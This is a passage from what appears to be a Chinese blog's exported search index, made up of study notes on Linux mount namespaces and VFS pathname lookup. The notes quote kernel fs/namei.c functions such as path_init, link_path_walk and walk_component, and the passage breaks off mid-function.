特别说明：虽然子设备树被挂载两次并且通过两处路径都能访问，但子设备的 dentry 和 inode 只保持一份。 一个挂载点可以挂载多个设备： 还可以对父设备树的同一个文件夹 dentry 进行多次挂载，最后路径查找时生效的是最后一次挂载的子设备树。 path 因为 Linux 提供的灵活的挂载规则，所以我们如果要标识一个路径 struct path 的话需要两个元素：vfsmount 和 dentry。 可以看到两个路径 struct path 最后引用到了同一 inode，但是路径 path 是不一样的，因为 path 指向的 vfsmount 是不一样的。 chroot Linux 还支持每个进程拥有不同的根目录，使用 chroot() 系统调用可以把当前进程的根目录设置为整棵文件系统树中的任何 path。 多名空间的层次化（mnt_namespace）Linux 系统为了支持 mnt_namespace，必须将单一的 mount 树扩展成多棵 mount 树。让我们先解释一下什么是 namespace 和 mnt_namespace。 Namespace 是 Linux 提供的一种机制，它可以将系统资源划分为多个独立的视图或环境。每个 namespace 都有自己的一组资源，对资源的改变不会影响到其他的 namespace。这种机制在容器技术中尤其重要，因为它使每个容器都可以有自己独立的系统视图，就像在自己的系统中一样。 mnt_namespace 是 namespace 的一种，它是用来隔离文件系统挂载点的。每个 mnt_namespace 都有自己的 mount 树，这意味着在一个 namespace 中挂载或卸载的文件系统不会影响到其他的 namespace。 举个例子，如果你在一个 namespace 中挂载了一个 USB 驱动器，那么这个驱动器仅在该 namespace 内可见。在其他 namespace 中，你将看不到这个驱动器，除非你在那个 namespace 中也执行了挂载操作。 因此，通过每个 mnt_namespace 拥有一棵独立的 mount 树，Linux 系统能为每个 namespace 提供独立的文件系统视图，从而实现更强大、更灵活的资源隔离功能。 参考资料 Mnt Namespace 详解 - 泰晓科技 (tinylab.org) GPT-4 Linux Namespace分析——mnt namespace的实现与应用 (hustcat.github.io)","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"},{"name":"namespace","slug":"Linux内核/namespace","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/namespace/"}],"tags":[]},{"title":"Rust学习 所有权","slug":"Rust学习-所有权","date":"2023-11-24T02:46:30.000Z","updated":"2023-11-24T02:46:30.054Z","comments":true,"path":"2023/11/24/Rust学习-所有权/","link":"","permalink":"http://example.com/2023/11/24/Rust%E5%AD%A6%E4%B9%A0-%E6%89%80%E6%9C%89%E6%9D%83/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"学习 Linux VFS虚拟文件系统 pathname lookup","slug":"学习-Linux-VFS虚拟文件系统-pathname-lookup","date":"2023-11-22T07:18:21.000Z","updated":"2023-12-15T06:54:52.866Z","comments":true,"path":"2023/11/22/学习-Linux-VFS虚拟文件系统-pathname-lookup/","link":"","permalink":"http://example.com/2023/11/22/%E5%AD%A6%E4%B9%A0-Linux-VFS%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F-pathname-lookup/","excerpt":"pathname lookuppathname lookup在VFS中，是调用次数最多的操作，在各种系统调用中都可以看到pathname lookup在发挥作用。 在进程需要操作文件时，它会将文件路径名传递给某些系统调用，例如open(),mkdir(),rename(),stat()等等","text":"pathname lookuppathname lookup在VFS中，是调用次数最多的操作，在各种系统调用中都可以看到pathname lookup在发挥作用。 在进程需要操作文件时，它会将文件路径名传递给某些系统调用，例如open(),mkdir(),rename(),stat()等等 首先path_init(),之后调用link_path_walk(),最后调用terminate_walk() path_init()函数 初始化nameidata结构体，确定pathname lookup的起点。 link_path_walk()函数 仅走到设置nd-&gt;last和nd-&gt;last_type的最终路径组件，最后一个组件仍然需要调用方来解决，调用方分别是:path_lookupat(),path_parentat(),path_openat()。 path_lookupat() 当有对象需要时调用，比如stat(),chmod()，它本质上是调用walk_componet()处理最终的路径名组件。 namei.c - fs&#x2F;namei.c - Linux source code (v6.6) - Bootlin 123456789101112131415161718192021222324252627282930313233/* Returns 0 and nd will be valid on success; Retuns error, otherwise. */static int path_lookupat(struct nameidata *nd, unsigned flags, struct path *path)&#123; const char *s = path_init(nd, flags); int err; if (unlikely(flags &amp; LOOKUP_DOWN) &amp;&amp; !IS_ERR(s)) &#123; err = handle_lookup_down(nd); if (unlikely(err &lt; 0)) s = ERR_PTR(err); &#125; while (!(err = link_path_walk(s, nd)) &amp;&amp; (s = lookup_last(nd)) != NULL) ; if (!err &amp;&amp; unlikely(nd-&gt;flags &amp; LOOKUP_MOUNTPOINT)) &#123; err = handle_lookup_down(nd); nd-&gt;state &amp;= ~ND_JUMPED; // no d_weak_revalidate(), please... &#125; if (!err) err = complete_walk(nd); if (!err &amp;&amp; nd-&gt;flags &amp; LOOKUP_DIRECTORY) if (!d_can_lookup(nd-&gt;path.dentry)) err = -ENOTDIR; if (!err) &#123; *path = nd-&gt;path; nd-&gt;path.mnt = NULL; nd-&gt;path.dentry = NULL; &#125; terminate_walk(nd); return err;&#125; path_parentat() 只是将父目录和最终的路径名组件返回给调用方，调用方的目标是创建名称（filename_create()),删除或者重命名名称(user_path_parent()) namei.c - fs&#x2F;namei.c - Linux source code (v6.6) - Bootlin 12345678910111213141516/* Returns 0 and nd will be valid on success; Retuns error, otherwise. */static int path_parentat(struct nameidata *nd, unsigned flags, struct path *parent)&#123; const char *s = path_init(nd, flags); int err = link_path_walk(s, nd); if (!err) err = complete_walk(nd); if (!err) &#123; *parent = nd-&gt;path; nd-&gt;path.mnt = NULL; nd-&gt;path.dentry = NULL; &#125; terminate_walk(nd); return err;&#125; path_openat() 用于open系统调用 namei.c - fs&#x2F;namei.c - Linux source code (v6.6) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738static struct file *path_openat(struct nameidata *nd, const struct open_flags *op, unsigned flags)&#123; struct file *file; int error; file = alloc_empty_file(op-&gt;open_flag, current_cred()); if (IS_ERR(file)) return file; if (unlikely(file-&gt;f_flags &amp; __O_TMPFILE)) &#123; error = do_tmpfile(nd, flags, op, file); &#125; else if (unlikely(file-&gt;f_flags &amp; O_PATH)) &#123; error = do_o_path(nd, flags, file); &#125; else &#123; const char *s = path_init(nd, flags); while (!(error = link_path_walk(s, nd)) &amp;&amp; (s = open_last_lookups(nd, file, op)) != NULL) ; if (!error) error = do_open(nd, file, op); terminate_walk(nd); &#125; if (likely(!error)) &#123; if (likely(file-&gt;f_mode &amp; FMODE_OPENED)) return file; WARN_ON(1); error = -EINVAL; &#125; fput(file); if (error == -EOPENSTALE) &#123; if (flags &amp; LOOKUP_RCU) error = -ECHILD; else error = -ESTALE; &#125; return ERR_PTR(error);&#125; 路径名路径名有时是文件名，用于表示文件系统中的对象，包含两种元素，斜杠和多个字符的序列，组件是一个或多个非&#x2F;&#x2F;的序列。这形成了两种路径，以斜杠开头的是绝对路径，从文件系统的根目录开始。其他的都是相对路径，从当前目录开始，或者从给定的*at()系统调用比如openat系统调用的文件描述符指定的其他位置开始。 路径可以分为两部分：最终组件和其他内容。 其他内容必须表示已存在的目录，否则将发生错误，例如ENOENT或者ENODIR.。 最终组件很重要。 不同的系统调用以完全不同的方式解释最终组件，比如有的系统调用创建它，有的不会创建它，而且最终组件可能不存在，可能只是空路径名或者只是斜杠的路径名。 “.”或者“..”的处理方式与其他的组件完全不同 以斜杠结尾的路径名，比如”&#x2F;tmp&#x2F;foo&#x2F;“，则很可能将其的最终组件视为空的。在很多情况下，空的最终组件是对的，比如rmdir和mkdir创建或删除一个目录，他们需要使用以&#x2F;结尾的路径名。 假设有一个路径/home/user/documents/，根据这个规则，documents 必须是一个已存在的目录，否则路径解析会失败。如果documents是一个文件而不是目录，或者documents根本不存在，并且也没有计划创建它，那么这个路径就是无法成功解析的。 Linux 路径名遍历代码（主要是在 fs/namei.c 中）处理所有这些问题：将路径分解为组件，将“其他所有内容”与最终组件完全分开处理，并检查是否在不允许的地方不使用尾部斜杠。它还解决了并发访问的重要问题。并发访问的问题在之后再讨论。 当一个进程正在查找路径名时，另一个进程可能会进行影响该查找的更改。 一个相当极端的情况是，如果将“a&#x2F;b”重命名为“a&#x2F;c&#x2F;b”，而另一个进程正在查找“a&#x2F;b&#x2F;..”，则该进程可能会在“a&#x2F;c”上成功解析。大多数种族都更加微妙，路径名查找的很大一部分任务是防止它们产生破坏性影响。 nameidatanamei.c - fs&#x2F;namei.c - Linux source code (v6.6) - Bootlin 1234567891011121314151617181920212223struct nameidata &#123; struct path path; struct qstr last; struct path root; struct inode *inode; /* path.dentry.d_inode */ unsigned int flags, state; unsigned seq, next_seq, m_seq, r_seq; int last_type; unsigned depth; int total_link_count; struct saved &#123; struct path link; struct delayed_call done; const char *name; unsigned seq; &#125; *stack, internal[EMBEDDED_LEVELS]; struct filename *name; struct nameidata *saved; unsigned root_seq; int dfd; vfsuid_t dir_vfsuid; umode_t dir_mode;&#125; __randomize_layout; 在pathname lookup的过程中，当前状态存储在一个struct nameidata中，namei是将name转换为inode的名称。struct nameidata中的重要字段： struct path path path.h - include&#x2F;linux&#x2F;path.h - Linux source code (v6.6) - Bootlin 1234struct path &#123; struct vfsmount *mnt; struct dentry *dentry;&#125; __randomize_layout; path 包含 struct vfsmount （嵌入在 struct mount 中)和 struct dentry 。这些共同记录了pathname lookup的当前状态。它们从引用起点（当前工作目录、根目录或由文件描述符标识的其他目录）开始，并在每个步骤中更新。始终持有d_lockref 和mnt_count 。 stuct qstr last 这是一个字符串和字符串长度，是路径名中的下一个组件的信息。 int last_type LAST_ROOT,LAST_DOT,LAST_DOTDOT,LAST_NORM其中之一，仅当类型为LAST_NORM时，last字段才有效。 struct path root 用于保存对文件系统有效根目录的引用，通常不需要这个引用，因此仅在首次使用此字段或者请求非标准根时才分配此字段。 当以下两个条件成立时需要根： 路径名或符号链接以“&#x2F;”开头。 使用”..“时 暂时忽略符号链接的处理，现在可以将link_path_walk()描述为： 给定路径(name)和nameidata结构(nd)，检查当前目录是否具有执行权限，然后更新last_type和last，并且进入到下一个组件上，如果这是最后一个组件则返回，否则调用walk_component()，然后循环下一个组件的处理，下一个组件的处理也是一样的。 这些组件中的每一个，或调用他们的函数，对于最后一个组件，如果不是LAST_NORM，查找的目标时创建某些内容，则last_type除了LAST_TYPE之外的任何值都会出错。例如，如果path_parentat()报告LAST_DOTDOT，则调用方不会尝试创建这个名称并通过测试last.name[last.len]，如果在最终组件之外有任何字符，则它必须是尾部斜杠。 walk_componetnamei.c - fs&#x2F;namei.c - Linux source code (v6.6) - Bootlin 12345678910111213141516171819202122232425static const char *walk_component(struct nameidata *nd, int flags)&#123; struct dentry *dentry; /* * &quot;.&quot; and &quot;..&quot; are special - &quot;..&quot; especially so because it has * to be able to know about the current root directory and * parent relationships. */ if (unlikely(nd-&gt;last_type != LAST_NORM)) &#123; if (!(flags &amp; WALK_MORE) &amp;&amp; nd-&gt;depth) put_link(nd); return handle_dots(nd, nd-&gt;last_type); &#125; dentry = lookup_fast(nd); if (IS_ERR(dentry)) return ERR_CAST(dentry); if (unlikely(!dentry)) &#123; dentry = lookup_slow(&amp;nd-&gt;last, nd-&gt;path.dentry, nd-&gt;flags); if (IS_ERR(dentry)) return ERR_CAST(dentry); &#125; if (!(flags &amp; WALK_MORE) &amp;&amp; nd-&gt;depth) put_link(nd); return step_into(nd, flags, dentry);&#125; 如果组件是LAST_DOT或LAST_DOTDOT则会调用handle_dots()。如果是LAST_NORM，首先调用lookup_fast()在dcache中查找，如果没找到，则会调用lookup_slow()，在文件系统中找到一个答案。 作为调用walk_component()的最后一步，step_into()，可以直接从walk_component()调用或者从handle_dots()调用step_into()。 step_into()会调用handle_mounts()来检查和处理挂载点。如果存在符号链接，step_into()会调用pick_link()来处理它。 源码分析现在通过源码来分析上述的内容，符号链接的处理在后文再详细讨论。 path_init在path_init中对nameidata的初始起点进行设置。 namei.c - fs&#x2F;namei.c - Linux source code (v6.6) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104/* must be paired with terminate_walk() */static const char *path_init(struct nameidata *nd, unsigned flags)&#123; int error; const char *s = nd-&gt;name-&gt;name; /* LOOKUP_CACHED requires RCU, ask caller to retry */ if ((flags &amp; (LOOKUP_RCU | LOOKUP_CACHED)) == LOOKUP_CACHED) return ERR_PTR(-EAGAIN); if (!*s) flags &amp;= ~LOOKUP_RCU; if (flags &amp; LOOKUP_RCU) rcu_read_lock(); else nd-&gt;seq = nd-&gt;next_seq = 0; nd-&gt;flags = flags; nd-&gt;state |= ND_JUMPED; nd-&gt;m_seq = __read_seqcount_begin(&amp;mount_lock.seqcount); nd-&gt;r_seq = __read_seqcount_begin(&amp;rename_lock.seqcount); smp_rmb(); if (nd-&gt;state &amp; ND_ROOT_PRESET) &#123; struct dentry *root = nd-&gt;root.dentry; struct inode *inode = root-&gt;d_inode; if (*s &amp;&amp; unlikely(!d_can_lookup(root))) return ERR_PTR(-ENOTDIR); nd-&gt;path = nd-&gt;root; nd-&gt;inode = inode; if (flags &amp; LOOKUP_RCU) &#123; nd-&gt;seq = read_seqcount_begin(&amp;nd-&gt;path.dentry-&gt;d_seq); nd-&gt;root_seq = nd-&gt;seq; &#125; else &#123; path_get(&amp;nd-&gt;path); &#125; return s; &#125; nd-&gt;root.mnt = NULL; /* Absolute pathname -- fetch the root (LOOKUP_IN_ROOT uses nd-&gt;dfd). */ if (*s == &#x27;/&#x27; &amp;&amp; !(flags &amp; LOOKUP_IN_ROOT)) &#123; error = nd_jump_root(nd); if (unlikely(error)) return ERR_PTR(error); return s; &#125; /* Relative pathname -- get the starting-point it is relative to. */ if (nd-&gt;dfd == AT_FDCWD) &#123; if (flags &amp; LOOKUP_RCU) &#123; struct fs_struct *fs = current-&gt;fs; unsigned seq; do &#123; seq = read_seqcount_begin(&amp;fs-&gt;seq); nd-&gt;path = fs-&gt;pwd; nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; nd-&gt;seq = __read_seqcount_begin(&amp;nd-&gt;path.dentry-&gt;d_seq); &#125; while (read_seqcount_retry(&amp;fs-&gt;seq, seq)); &#125; else &#123; get_fs_pwd(current-&gt;fs, &amp;nd-&gt;path); nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; &#125; &#125; else &#123; /* Caller must check execute permissions on the starting path component */ struct fd f = fdget_raw(nd-&gt;dfd); struct dentry *dentry; if (!f.file) return ERR_PTR(-EBADF); dentry = f.file-&gt;f_path.dentry; if (*s &amp;&amp; unlikely(!d_can_lookup(dentry))) &#123; fdput(f); return ERR_PTR(-ENOTDIR); &#125; nd-&gt;path = f.file-&gt;f_path; if (flags &amp; LOOKUP_RCU) &#123; nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; nd-&gt;seq = read_seqcount_begin(&amp;nd-&gt;path.dentry-&gt;d_seq); &#125; else &#123; path_get(&amp;nd-&gt;path); nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; &#125; fdput(f); &#125; /* For scoped-lookups we need to set the root to the dirfd as well. */ if (flags &amp; LOOKUP_IS_SCOPED) &#123; nd-&gt;root = nd-&gt;path; if (flags &amp; LOOKUP_RCU) &#123; nd-&gt;root_seq = nd-&gt;seq; &#125; else &#123; path_get(&amp;nd-&gt;root); nd-&gt;state |= ND_ROOT_GRABBED; &#125; &#125; return s;&#125; 在这段代码中 123456if (*s == &#x27;/&#x27; &amp;&amp; !(flags &amp; LOOKUP_IN_ROOT)) &#123; error = nd_jump_root(nd); if (unlikely(error)) return ERR_PTR(error); return s;&#125; 首先判断s的首个字符为&#x2F;时，即为绝对路径查找时，在nd_jump_root中设置对应的nameidata结构体 namei.c - fs&#x2F;namei.c - Linux source code (v6.6) - Bootlin 12345678910111213141516171819202122232425262728293031static int nd_jump_root(struct nameidata *nd)&#123; if (unlikely(nd-&gt;flags &amp; LOOKUP_BENEATH)) return -EXDEV; if (unlikely(nd-&gt;flags &amp; LOOKUP_NO_XDEV)) &#123; /* Absolute path arguments to path_init() are allowed. */ if (nd-&gt;path.mnt != NULL &amp;&amp; nd-&gt;path.mnt != nd-&gt;root.mnt) return -EXDEV; &#125; if (!nd-&gt;root.mnt) &#123; int error = set_root(nd); if (error) return error; &#125; if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; struct dentry *d; nd-&gt;path = nd-&gt;root; d = nd-&gt;path.dentry; nd-&gt;inode = d-&gt;d_inode; nd-&gt;seq = nd-&gt;root_seq; if (read_seqcount_retry(&amp;d-&gt;d_seq, nd-&gt;seq)) return -ECHILD; &#125; else &#123; path_put(&amp;nd-&gt;path); nd-&gt;path = nd-&gt;root; path_get(&amp;nd-&gt;path); nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; &#125; nd-&gt;state |= ND_JUMPED; return 0;&#125; namei.c - fs&#x2F;namei.c - Linux source code (v6.6) - Bootlin 1234567891011121314151617181920212223242526static int set_root(struct nameidata *nd)&#123; struct fs_struct *fs = current-&gt;fs; /* * Jumping to the real root in a scoped-lookup is a BUG in namei, but we * still have to ensure it doesn&#x27;t happen because it will cause a breakout * from the dirfd. */ if (WARN_ON(nd-&gt;flags &amp; LOOKUP_IS_SCOPED)) return -ENOTRECOVERABLE; if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; unsigned seq; do &#123; seq = read_seqcount_begin(&amp;fs-&gt;seq); nd-&gt;root = fs-&gt;root; nd-&gt;root_seq = __read_seqcount_begin(&amp;nd-&gt;root.dentry-&gt;d_seq); &#125; while (read_seqcount_retry(&amp;fs-&gt;seq, seq)); &#125; else &#123; get_fs_root(fs, &amp;nd-&gt;root); nd-&gt;state |= ND_ROOT_GRABBED; &#125; return 0;&#125; 可以看到设置了相应的nd-&gt;root和相应的nd-&gt;path即查找起点为根目录。 然后看到下面这段代码： 1234567891011121314151617181920212223242526272829303132333435363738394041/* Relative pathname -- get the starting-point it is relative to. */ if (nd-&gt;dfd == AT_FDCWD) &#123; if (flags &amp; LOOKUP_RCU) &#123; struct fs_struct *fs = current-&gt;fs; unsigned seq; do &#123; seq = read_seqcount_begin(&amp;fs-&gt;seq); nd-&gt;path = fs-&gt;pwd; nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; nd-&gt;seq = __read_seqcount_begin(&amp;nd-&gt;path.dentry-&gt;d_seq); &#125; while (read_seqcount_retry(&amp;fs-&gt;seq, seq)); &#125; else &#123; get_fs_pwd(current-&gt;fs, &amp;nd-&gt;path); nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; &#125; &#125; else &#123; /* Caller must check execute permissions on the starting path component */ struct fd f = fdget_raw(nd-&gt;dfd); struct dentry *dentry; if (!f.file) return ERR_PTR(-EBADF); dentry = f.file-&gt;f_path.dentry; if (*s &amp;&amp; unlikely(!d_can_lookup(dentry))) &#123; fdput(f); return ERR_PTR(-ENOTDIR); &#125; nd-&gt;path = f.file-&gt;f_path; if (flags &amp; LOOKUP_RCU) &#123; nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; nd-&gt;seq = read_seqcount_begin(&amp;nd-&gt;path.dentry-&gt;d_seq); &#125; else &#123; path_get(&amp;nd-&gt;path); nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; &#125; fdput(f); &#125; 如果在初始查找的文件描述符中，即相对查找的起点路径。 如果设置为AT_FDCWD，即从当前目录开始查找，或者设置为对应的文件描述符的目录。 根据不同的情况进行相应的设置，将nameidata结构体设置为对应的起点。 link_path_walk123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109/* * Name resolution. * This is the basic name resolution function, turning a pathname into * the final dentry. We expect &#x27;base&#x27; to be positive and a directory. * * Returns 0 and nd will have valid dentry and mnt on success. * Returns error and drops reference to input namei data on failure. */static int link_path_walk(const char *name, struct nameidata *nd)&#123; int depth = 0; // depth &lt;= nd-&gt;depth int err; nd-&gt;last_type = LAST_ROOT; nd-&gt;flags |= LOOKUP_PARENT; if (IS_ERR(name)) return PTR_ERR(name); while (*name==&#x27;/&#x27;) name++; if (!*name) &#123; nd-&gt;dir_mode = 0; // short-circuit the &#x27;hardening&#x27; idiocy return 0; &#125; /* At this point we know we have a real path component. */ for(;;) &#123; struct mnt_idmap *idmap; const char *link; u64 hash_len; int type; idmap = mnt_idmap(nd-&gt;path.mnt); err = may_lookup(idmap, nd); if (err) return err; hash_len = hash_name(nd-&gt;path.dentry, name); type = LAST_NORM; if (name[0] == &#x27;.&#x27;) switch (hashlen_len(hash_len)) &#123; case 2: if (name[1] == &#x27;.&#x27;) &#123; type = LAST_DOTDOT; nd-&gt;state |= ND_JUMPED; &#125; break; case 1: type = LAST_DOT; &#125; if (likely(type == LAST_NORM)) &#123; struct dentry *parent = nd-&gt;path.dentry; nd-&gt;state &amp;= ~ND_JUMPED; if (unlikely(parent-&gt;d_flags &amp; DCACHE_OP_HASH)) &#123; struct qstr this = &#123; &#123; .hash_len = hash_len &#125;, .name = name &#125;; err = parent-&gt;d_op-&gt;d_hash(parent, &amp;this); if (err &lt; 0) return err; hash_len = this.hash_len; name = this.name; &#125; &#125; nd-&gt;last.hash_len = hash_len; nd-&gt;last.name = name; nd-&gt;last_type = type; name += hashlen_len(hash_len); if (!*name) goto OK; /* * If it wasn&#x27;t NUL, we know it was &#x27;/&#x27;. Skip that * slash, and continue until no more slashes. */ do &#123; name++; &#125; while (unlikely(*name == &#x27;/&#x27;)); if (unlikely(!*name)) &#123;OK: /* pathname or trailing symlink, done */ if (!depth) &#123; nd-&gt;dir_vfsuid = i_uid_into_vfsuid(idmap, nd-&gt;inode); nd-&gt;dir_mode = nd-&gt;inode-&gt;i_mode; nd-&gt;flags &amp;= ~LOOKUP_PARENT; return 0; &#125; /* last component of nested symlink */ name = nd-&gt;stack[--depth].name; link = walk_component(nd, 0); &#125; else &#123; /* not the last component */ link = walk_component(nd, WALK_MORE); &#125; if (unlikely(link)) &#123; if (IS_ERR(link)) return PTR_ERR(link); /* a symlink to follow */ nd-&gt;stack[depth++].name = name; name = link; continue; &#125; if (unlikely(!d_can_lookup(nd-&gt;path.dentry))) &#123; if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; if (!try_to_unlazy(nd)) return -ECHILD; &#125; return -ENOTDIR; &#125; &#125;&#125; 12345678910nd-&gt;last_type = LAST_ROOT;nd-&gt;flags |= LOOKUP_PARENT;if (IS_ERR(name)) return PTR_ERR(name);while (*name==&#x27;/&#x27;) name++;if (!*name) &#123; nd-&gt;dir_mode = 0; // short-circuit the &#x27;hardening&#x27; idiocy return 0;&#125; 首先对last_type进行设置，并且跳过pathname初始的&#x2F;，即可以获取第一个组件。然后进入下面的循环对组件进行处理。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384/* At this point we know we have a real path component. */ for(;;) &#123; struct mnt_idmap *idmap; const char *link; u64 hash_len; int type; idmap = mnt_idmap(nd-&gt;path.mnt); err = may_lookup(idmap, nd); if (err) return err; hash_len = hash_name(nd-&gt;path.dentry, name); type = LAST_NORM; if (name[0] == &#x27;.&#x27;) switch (hashlen_len(hash_len)) &#123; case 2: if (name[1] == &#x27;.&#x27;) &#123; type = LAST_DOTDOT; nd-&gt;state |= ND_JUMPED; &#125; break; case 1: type = LAST_DOT; &#125; if (likely(type == LAST_NORM)) &#123; struct dentry *parent = nd-&gt;path.dentry; nd-&gt;state &amp;= ~ND_JUMPED; if (unlikely(parent-&gt;d_flags &amp; DCACHE_OP_HASH)) &#123; struct qstr this = &#123; &#123; .hash_len = hash_len &#125;, .name = name &#125;; err = parent-&gt;d_op-&gt;d_hash(parent, &amp;this); if (err &lt; 0) return err; hash_len = this.hash_len; name = this.name; &#125; &#125; nd-&gt;last.hash_len = hash_len; nd-&gt;last.name = name; nd-&gt;last_type = type; name += hashlen_len(hash_len); if (!*name) goto OK; /* * If it wasn&#x27;t NUL, we know it was &#x27;/&#x27;. Skip that * slash, and continue until no more slashes. */ do &#123; name++; &#125; while (unlikely(*name == &#x27;/&#x27;)); if (unlikely(!*name)) &#123;OK: /* pathname or trailing symlink, done */ if (!depth) &#123; nd-&gt;dir_vfsuid = i_uid_into_vfsuid(idmap, nd-&gt;inode); nd-&gt;dir_mode = nd-&gt;inode-&gt;i_mode; nd-&gt;flags &amp;= ~LOOKUP_PARENT; return 0; &#125; /* last component of nested symlink */ name = nd-&gt;stack[--depth].name; link = walk_component(nd, 0); &#125; else &#123; /* not the last component */ link = walk_component(nd, WALK_MORE); &#125; if (unlikely(link)) &#123; if (IS_ERR(link)) return PTR_ERR(link); /* a symlink to follow */ nd-&gt;stack[depth++].name = name; name = link; continue; &#125; if (unlikely(!d_can_lookup(nd-&gt;path.dentry))) &#123; if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; if (!try_to_unlazy(nd)) return -ECHILD; &#125; return -ENOTDIR; &#125; &#125; 首先看到这段代码 12345678910111213 hash_len = hash_name(nd-&gt;path.dentry, name);type = LAST_NORM;if (name[0] == &#x27;.&#x27;) switch (hashlen_len(hash_len)) &#123; case 2: if (name[1] == &#x27;.&#x27;) &#123; type = LAST_DOTDOT; nd-&gt;state |= ND_JUMPED; &#125; break; case 1: type = LAST_DOT;&#125; 首先对第一个组件,hash_name计算第一个组件的长度和hash。 如果第一个组件的第一个字符为.，则判断它是.还是..，并对他们的type进行对应的设置。 123456789101112 if (likely(type == LAST_NORM)) &#123; struct dentry *parent = nd-&gt;path.dentry; nd-&gt;state &amp;= ~ND_JUMPED; if (unlikely(parent-&gt;d_flags &amp; DCACHE_OP_HASH)) &#123; struct qstr this = &#123; &#123; .hash_len = hash_len &#125;, .name = name &#125;; err = parent-&gt;d_op-&gt;d_hash(parent, &amp;this); if (err &lt; 0) return err; hash_len = this.hash_len; name = this.name; &#125;&#125; 如果对组件的判断，判断不是.或者..,那么它的type为LAST_NORM 然后看到相应的处理，首先设置了一个parent为nd-&gt;path.dentry，因为如果我们查找下一个组件的dentry的话，现在的path中dentry就是下个组件的parent。 然后对一些值进行设置，其中的值都是根据当前组件设置的。 123456789101112131415161718192021222324252627282930 nd-&gt;last.hash_len = hash_len; nd-&gt;last.name = name; nd-&gt;last_type = type; name += hashlen_len(hash_len); if (!*name) goto OK; /* * If it wasn&#x27;t NUL, we know it was &#x27;/&#x27;. Skip that * slash, and continue until no more slashes. */ do &#123; name++; &#125; while (unlikely(*name == &#x27;/&#x27;)); if (unlikely(!*name)) &#123;OK: /* pathname or trailing symlink, done */ if (!depth) &#123; nd-&gt;dir_vfsuid = i_uid_into_vfsuid(idmap, nd-&gt;inode); nd-&gt;dir_mode = nd-&gt;inode-&gt;i_mode; nd-&gt;flags &amp;= ~LOOKUP_PARENT; return 0; &#125; /* last component of nested symlink */ name = nd-&gt;stack[--depth].name; link = walk_component(nd, 0); &#125; else &#123; /* not the last component */ link = walk_component(nd, WALK_MORE); &#125; 对last的值进行处理，last设置为下面要处理的组件的信息。 如果name指针往后移了一个组件的长度之后，判断是否是NULL，如果不是NULL则肯定是&#x2F;，跳过&#x2F;之后进行下一步操作继续判断name是否为NULL。 也就是说如果name指针为NULL时进行的操作为： 12345678910 /* pathname or trailing symlink, done */if (!depth) &#123; nd-&gt;dir_vfsuid = i_uid_into_vfsuid(idmap, nd-&gt;inode); nd-&gt;dir_mode = nd-&gt;inode-&gt;i_mode; nd-&gt;flags &amp;= ~LOOKUP_PARENT; return 0;&#125;/* last component of nested symlink */name = nd-&gt;stack[--depth].name;link = walk_component(nd, 0); 如果name指针不是NULL时进行的操作为： 12/* not the last component */link = walk_component(nd, WALK_MORE); 如果name指针不是NULL也代表现在处理的组件不是最后一个组件。 12345678910111213141516171819202122232425static const char *walk_component(struct nameidata *nd, int flags)&#123; struct dentry *dentry; /* * &quot;.&quot; and &quot;..&quot; are special - &quot;..&quot; especially so because it has * to be able to know about the current root directory and * parent relationships. */ if (unlikely(nd-&gt;last_type != LAST_NORM)) &#123; if (!(flags &amp; WALK_MORE) &amp;&amp; nd-&gt;depth) put_link(nd); return handle_dots(nd, nd-&gt;last_type); &#125; dentry = lookup_fast(nd); if (IS_ERR(dentry)) return ERR_CAST(dentry); if (unlikely(!dentry)) &#123; dentry = lookup_slow(&amp;nd-&gt;last, nd-&gt;path.dentry, nd-&gt;flags); if (IS_ERR(dentry)) return ERR_CAST(dentry); &#125; if (!(flags &amp; WALK_MORE) &amp;&amp; nd-&gt;depth) put_link(nd); return step_into(nd, flags, dentry);&#125; 如果nd-&gt;last_type不是LAST_NORM的话，则要处理的组件是.或..,进入handle_dots()进行处理。 如果nd-&gt;last_type是LAST_NORM首先调用lookup_fast函数，从dcache中查找组件的dentry。 如果lookup_fast没找到，则会根据当前查找的dentry的inode，去对应的文件系统中查找。 比如：如果是绝对路径查找，在查找第一个组件时，lookup_fast没找到，则会根据path_init设置的nd-&gt;path.dentry的inode来进入具体的文件系统来查找。 如果经过lookup_slow和lookup_fast查找到了正确的dentry，则会进行下一步操作，step_into() namei.c - fs&#x2F;namei.c - Linux source code (v6.6) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/* * Do we need to follow links? We _really_ want to be able * to do this check without having to look at inode-&gt;i_op, * so we keep a cache of &quot;no, this doesn&#x27;t need follow_link&quot; * for the common case. * * NOTE: dentry must be what nd-&gt;next_seq had been sampled from. */static const char *step_into(struct nameidata *nd, int flags, struct dentry *dentry)&#123; struct path path; struct inode *inode; int err = handle_mounts(nd, dentry, &amp;path); if (err &lt; 0) return ERR_PTR(err); inode = path.dentry-&gt;d_inode; if (likely(!d_is_symlink(path.dentry)) || ((flags &amp; WALK_TRAILING) &amp;&amp; !(nd-&gt;flags &amp; LOOKUP_FOLLOW)) || (flags &amp; WALK_NOFOLLOW)) &#123; /* not a symlink or should not follow */ if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; if 